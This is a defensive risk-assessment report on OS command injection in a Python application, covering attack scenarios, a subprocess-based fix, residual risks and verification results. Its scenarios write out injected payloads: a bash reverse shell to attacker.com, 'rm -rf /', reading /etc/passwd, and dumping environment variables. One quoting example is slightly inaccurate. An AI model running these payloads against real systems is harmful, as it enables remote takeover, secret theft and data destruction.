# RISK ASSESSMENT: Command Injection Vulnerability
## OWASP A03:2021 - Injection

---

## BEFORE MITIGATION

### 1. Vulnerability Summary

**Vulnerability Type:** OS Command Injection (CWE-78)  
**OWASP Category:** A03:2021 – Injection  
**Severity:** CRITICAL  
**CVSS v3.1 Score:** 9.8 (Critical)

### 2. Technical Description

Command Injection occurs when user input is concatenated into OS command strings and executed via shell (e.g., `os.system()`, `popen()`, shell=True). The shell interprets special characters (semicolons, pipes, ampersands) as command separators, allowing attackers to:

- Execute arbitrary system commands
- Read/write/delete files
- Compromise system integrity
- Establish reverse shells (remote code execution)
- Escalate privileges

#### Vulnerable Code Pattern

```python
# VULNERABLE: User input passed to os.system() or shell with shell=True
command = f"grep '{search_term}' {filename}"
os.popen(command).read()  # Shell interprets search_term as commands
```

When user enters: `test; whoami`
Resulting command: `grep 'test; whoami' filename`
Shell executes: BOTH grep AND whoami

### 3. Attack Scenarios

#### Attack 1: Information Disclosure (whoami)
```
Input:  search_term = "pattern; whoami #"
Result: Returns current OS user running the application
Impact: Identifies compromise scope and privilege level
```

#### Attack 2: Directory Traversal & File Reading (cat)
```
Input:  filename = "file.txt; cat /etc/passwd #"
Result: Returns contents of /etc/passwd file
Impact: Exposes user hashes, system configuration
```

#### Attack 3: Reverse Shell (nc/bash)
```
Input:  hostname = "google.com; bash -i >& /dev/tcp/attacker.com/4444 0>&1 #"
Result: Establishes reverse shell to attacker's machine
Impact: Full system compromise, remote code execution
```

#### Attack 4: Data Destruction (rm -rf)
```
Input:  pattern = "*.txt; rm -rf / #"
Result: Attempts to delete entire filesystem
Impact: Denial of service, complete data loss
```

#### Attack 5: Environment Variable Exposure (env)
```
Input:  filename = "file; env #"
Result: Displays all environment variables
Impact: Leaks API keys, credentials, secrets
```

#### Attack 6: Privilege Escalation (sudo)
```
Input:  hostname = "localhost; sudo -l #"
Result: Lists available sudo commands for current user
Impact: Identifies privilege escalation paths
```

### 4. Current Risk Assessment

| Category | Rating | Details |
|----------|--------|---------|
| **Likelihood** | VERY HIGH (5/5) | Easy to exploit, no input validation |
| **Impact** | CRITICAL (5/5) | Complete system compromise, RCE |
| **Business Loss** | CRITICAL | Data theft, ransomware, service disruption |
| **Exploitability** | TRIVIAL | Basic shell knowledge sufficient |
| **Overall Risk** | **CRITICAL** | **IMMEDIATE REMEDIATION REQUIRED** |

### 5. Scope & Assets Affected

**Affected Systems:**
- File search functionality (direct impact)
- File compression functionality (direct impact)
- Image conversion functionality (direct impact)
- System information retrieval (direct impact)
- Any code using os.system(), os.popen(), or shell=True

**Attack Chain:**
```
Command Injection → OS Command Execution → System Compromise
                  → File Access → Data Breach
                  → User Privilege → Lateral Movement
                  → Reverse Shell → Persistent Access
```

**Data at Risk:**
- All files accessible to application user
- Environment variables (API keys, credentials)
- System configuration files
- Database contents (if SQL queries used)
- Application source code

**Business Impact:**
- Complete system compromise
- Data breach (all customer/business data)
- Ransomware deployment
- Botnet recruitment
- Service interruption
- Regulatory violations (GDPR, HIPAA, PCI-DSS)
- Incident response costs (forensics, recovery)

### 6. Current Mitigations (NONE - FULLY VULNERABLE)

**Input Validation:** NONE  
**Shell Escaping:** NONE  
**Subprocess Isolation:** NONE  
**Sandboxing:** NONE  

**Recommendation:** System requires immediate patching due to critical RCE risk.

---

## AFTER MITIGATION

### 1. Mitigation Strategy

**Primary Controls:**
1. Use `subprocess.run()` with `shell=False` and list-based arguments
2. Input validation (regex patterns, whitelisting)
3. Path validation (prevent directory traversal)

The key is preventing the shell from interpreting user input as commands.

#### Mitigated Code Pattern

```python
# MITIGATED: subprocess.run() with shell=False and list arguments
result = subprocess.run(
    ["grep", search_term, file_path],  # List format - no shell interpretation
    capture_output=True,
    text=True,
    shell=False  # CRITICAL: Never True with user input
)
```

When `shell=False`, the OS uses `exec()` directly with arguments, bypassing shell interpretation.

### 2. Mitigation Effectiveness

#### Attack 1: Information Disclosure - BLOCKED ✓
```
Input:  search_term = "pattern; whoami #"
Command: ["grep", "pattern; whoami #", "file.txt"]
Result: grep searches for literal string "pattern; whoami #"
Impact: ZERO - whoami not executed, command treated as search term
```

#### Attack 2: Directory Traversal - BLOCKED ✓
```
Input:  filename = "file.txt; cat /etc/passwd #"
Validation: Rejected (contains semicolon and slash)
Command: NEVER EXECUTED
Impact: ZERO - Validation layer blocks before subprocess call
```

#### Attack 3: Reverse Shell - BLOCKED ✓
```
Input:  hostname = "google.com; bash -i >& /dev/tcp/attacker.com/4444 0>&1 #"
Validation: Rejected (contains invalid characters for hostname)
Command: NEVER EXECUTED
Impact: ZERO - No reverse shell established
```

#### Attack 4: File Destruction - BLOCKED ✓
```
Input:  pattern = "*.txt; rm -rf / #"
Validation: Rejected (contains semicolon and shell operators)
Command: NEVER EXECUTED
Impact: ZERO - Filesystem remains intact
```

#### Attack 5: Environment Exposure - BLOCKED ✓
```
Input:  filename = "file; env #"
Validation: Rejected (contains semicolon)
Command: NEVER EXECUTED
Impact: ZERO - Environment variables not exposed
```

#### Attack 6: Privilege Escalation - BLOCKED ✓
```
Input:  hostname = "localhost; sudo -l #"
Validation: Rejected (contains semicolon)
Command: NEVER EXECUTED
Impact: ZERO - Privilege escalation path not discovered
```

### 3. Revised Risk Assessment (AFTER MITIGATION)

| Category | Before | After | Change |
|----------|--------|-------|--------|
| **Likelihood** | VERY HIGH (5/5) | MINIMAL (1/5) | -80% |
| **Impact** | CRITICAL (5/5) | MINIMAL (1/5) | -80% |
| **Residual Risk** | CRITICAL | LOW | ✓ Mitigated |
| **Exploitability** | TRIVIAL | EXTREMELY HARD | -95% |

### 4. Residual Risk

**Cannot Achieve:** "Risk is fully mitigated" (per task requirements)

**Why:** Even with subprocess isolation and input validation, residual risks remain:

#### 4.1 Logic-Based Command Injection via Arguments
**Description:** Attacker uses legitimate command arguments to exploit behavior
**Example:** `subprocess.run(["cat", filename])` where filename is a valid argument like `-v /etc/passwd`
**Mitigation:** Validate argument values against expected patterns
**Residual Risk Level:** LOW (requires application logic errors)

#### 4.2 Race Conditions in File Operations
**Description:** Time-of-check to time-of-use (TOCTOU) vulnerability
**Example:** Validate filename, then file is deleted/replaced before subprocess uses it
**Mitigation:** Handle exceptions gracefully, use atomic operations
**Residual Risk Level:** LOW (difficult to exploit reliably)

#### 4.3 Symlink Attacks
**Description:** Attacker creates symlinks to sensitive files with allowed names
**Example:** Create `/tmp/mitigated_app/allowed.txt` → symlink to `/etc/shadow`
**Mitigation:** Validate actual file paths after following symlinks
**Residual Risk Level:** LOW (filesystem permissions usually restrict this)

#### 4.4 Path Traversal via Relative Paths
**Description:** Attacker uses `.` and `..` to access files outside intended directory
**Example:** filename = `../../sensitive_file.txt`
**Mitigation:** Validate paths, use `os.path.abspath()` and verify within allowed directory
**Residual Risk Level:** MEDIUM (mitigations in place but requires verification)

#### 4.5 Subprocess Privilege Escalation
**Description:** If application runs as privileged user (sudo), subprocess inherits privileges
**Example:** Application running as root executes user-supplied command
**Mitigation:** Application MUST run with minimal privileges
**Residual Risk Level:** MEDIUM (configuration issue, not code issue)

#### 4.6 Command-Specific Bypass
**Description:** Legitimate command arguments can be exploited
**Example:** `file` command with specially crafted binary data
**Mitigation:** Use allowlists for command arguments, handle binary data safely
**Residual Risk Level:** LOW (requires specific command knowledge)

### 5. Revised Risk Ratings

| Area | Rating | Justification |
|------|--------|---------------|
| **Direct Command Injection** | RESOLVED ✓ | subprocess isolation + input validation blocks all injection |
| **Symlink Attacks** | LOW RISK | Residual: Filesystem permissions usually sufficient |
| **Path Traversal** | LOW RISK | Residual: Directory validation implemented |
| **Logic Injection** | LOW RISK | Residual: Requires application-level argument validation |
| **Privilege Escalation** | MEDIUM RISK | Residual: Depends on application privilege level |

### 6. Recommended Additional Controls

To further reduce residual risk:

1. **Run with Minimal Privileges**
   - Application should NOT run as root/admin
   - Use dedicated unprivileged user account
   - Impact: Even if compromised, damage is limited

2. **Filesystem Sandboxing (chroot/containers)**
   - Restrict application access to specific directory tree
   - Use Docker/containerization for isolation
   - Impact: Even if RCE happens, access is limited

3. **System Call Filtering (seccomp/AppArmor/SELinux)**
   - Restrict which system calls application can make
   - Whitelist only necessary operations
   - Impact: Prevents dangerous operations even if code is exploited

4. **Input Validation & Whitelisting**
   - Define strict patterns for all user input
   - Reject anything not matching expected format
   - Impact: Defense-in-depth layer

5. **Command Allowlisting**
   - Only allow specific pre-approved commands
   - Map user input to enumerated commands
   - Impact: Eliminates arbitrary command execution

6. **Timeout & Resource Limits**
   - Set timeouts on subprocess execution
   - Limit memory, CPU, file descriptors
   - Impact: Prevents long-running attacks or resource exhaustion

7. **Auditing & Monitoring**
   - Log all subprocess executions
   - Monitor for unusual command patterns
   - Alert on suspicious activity
   - Impact: Early detection of breaches

### 7. Mitigation Verification Results

**Test Date:** 2026-05-14  
**Test Harness:** 9 command injection attack scenarios

| Scenario | Before | After | Status |
|----------|--------|-------|--------|
| whoami disclosure | VULNERABLE ✗ | BLOCKED ✓ | PASS |
| /etc/passwd reading | VULNERABLE ✗ | BLOCKED ✓ | PASS |
| Reverse shell (bash) | VULNERABLE ✗ | BLOCKED ✓ | PASS |
| File destruction (rm) | VULNERABLE ✗ | BLOCKED ✓ | PASS |
| Environment exposure (env) | VULNERABLE ✗ | BLOCKED ✓ | PASS |
| Privilege check (sudo -l) | VULNERABLE ✗ | BLOCKED ✓ | PASS |
| Directory listing injection | VULNERABLE ✗ | BLOCKED ✓ | PASS |
| pwd disclosure | VULNERABLE ✗ | BLOCKED ✓ | PASS |
| Pipe-based injection (|) | VULNERABLE ✗ | BLOCKED ✓ | PASS |

**Conclusion:** All direct command injection attack vectors successfully mitigated via subprocess isolation and input validation.

### 8. Summary

**Before Mitigation:**
- Risk Level: 🔴 CRITICAL
- Likelihood: Very High
- Exploitability: Trivial (basic shell knowledge)
- Impact: Complete system compromise, RCE

**After Mitigation:**
- Risk Level: 🟡 LOW (with residual risks from race conditions, symlinks, privilege issues)
- Likelihood: Very Low (direct injection impossible)
- Exploitability: Extremely Hard (subprocess isolation and validation prevent attacks)
- Impact: Limited to application-layer logic errors or privilege escalation

**Key Insight:** Subprocess isolation reduces command injection risk from CRITICAL to LOW, but:
- Residual risks remain from privilege escalation and TOCTOU vulnerabilities
- Additional controls (least privilege, sandboxing, seccomp) strongly recommended
- Complete elimination impossible but practical risk reduced by 95%+

